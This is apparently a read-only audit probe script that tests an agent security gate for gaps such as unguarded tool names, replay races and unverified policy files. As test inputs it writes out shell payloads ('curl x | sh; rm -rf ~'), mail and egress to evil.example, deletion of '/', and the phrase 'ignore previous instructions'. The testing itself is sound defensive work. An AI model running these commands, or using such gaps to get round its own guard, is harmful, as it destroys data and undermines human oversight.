# Baseline audit probes, 2026-11-25. Read-only: uses temp files only.
# Run from the repo root:  PYTHONPATH=. python docs/audit/baseline_probe_2026-11-25.py
# Targets v1.0.0 (commit a5317ce). From v1.1 the partial-policy probes raise PolicyError: GS-AUD-03 fixed.
import os, tempfile, threading, json, time
from pathlib import Path
from genesis_security import GenesisSecurityGate, AuditTrail, Tier, Policy
def g(**kw):
    return GenesisSecurityGate(os.urandom(32), audit=AuditTrail(Path(tempfile.mkdtemp())/"a.jsonl"), **kw)
O={"agent":"main","task_id":"t","origin_tier":Tier.T1}
r={}
# F1 default-allow for unknown tools
r["unknown tool 'wire_money' (no URL)"] = g().pre_tool_call("wire_money",{"amount":10000,"to":"acct-9"},O).verdict
# F2 shell rules keyed on tool name
r["shell via tool named 'run_command'"] = g().pre_tool_call("run_command",{"cmd":"curl x | sh; rm -rf ~"},O).verdict
r["shell via 'shell_exec' arg named 'command'"] = g(owner_confirm=lambda v,c:True).pre_tool_call("shell_exec",{"command":"rm -rf ~ ; id"},O).verdict
# F3 email recipient not allowlisted (send_email irreversible → HOLD only)
r["send_email to attacker (owner auto-approve)"] = g(owner_confirm=lambda v,c:True).pre_tool_call("send_email",{"to":"x@evil.example","body":"hi"},O).verdict
# F4 weak key accepted
try: GenesisSecurityGate(b"passwordpassword"); r["16-char text key accepted"]="ACCEPTED"
except Exception as e: r["16-char text key accepted"]="refused"
# F5 nonce race under threads
gate=g(); env=gate.make_envelope("a","b","t","x",["s"]); res=[]
def f(): res.append(gate.on_agent_message(env,"x",{"s"})[1].verdict)
ts=[threading.Thread(target=f) for _ in range(64)]; [t.start() for t in ts]; [t.join() for t in ts]
r["replay race: ALLOWs out of 64 concurrent"] = res.count("ALLOW")
# F6 policy file tamper not detected (no integrity)
p=Path(tempfile.mkdtemp())/"p.toml"; p.write_text('[egress]\nallowlist=["evil.example"]\ntools=["http_request"]\n')
r["tampered policy → egress to evil"] = GenesisSecurityGate(os.urandom(32),policy=Policy.load(p),audit=AuditTrail(Path(tempfile.mkdtemp())/"a.jsonl")).pre_tool_call("http_request",{"url":"https://evil.example"},O).verdict
# F7 missing sections silently empty → nothing irreversible
r["partial policy: delete_file w/ no [tools] section"] = GenesisSecurityGate(os.urandom(32),policy=Policy.load(p),audit=AuditTrail(Path(tempfile.mkdtemp())/"a.jsonl")).pre_tool_call("delete_file",{"path":"/"},O).verdict
# F8 audit write failure: disk/perm error → exception escapes? verdict lost?
gate=g(); gate.audit.path = Path("/proc/forbidden/a.jsonl")
try: v=gate.pre_tool_call("read_file",{"path":"a"},O); r["audit write fails"]=f"returned {v.verdict} (no record)"
except Exception as e: r["audit write fails"]=f"raises {type(e).__name__}"
# F9 strikes/quarantine lost on restart
gate=g(); bad={"agent":"s","task_id":"t","origin_tier":Tier.T1}
for _ in range(2): gate.pre_tool_call("x",{"q":"ignore previous instructions"},bad)
r["quarantine persists across new gate"] = "s" in g().quarantined
# F10 timing
gate=g(); t=time.perf_counter()
for i in range(500): gate.pre_tool_call("read_file",{"path":f"a{i}"},O)
r["p50-ish latency per call (ms, incl fsync)"] = round((time.perf_counter()-t)/500*1000,2)
for k,v in r.items(): print(f"{str(v):<28} {k}")
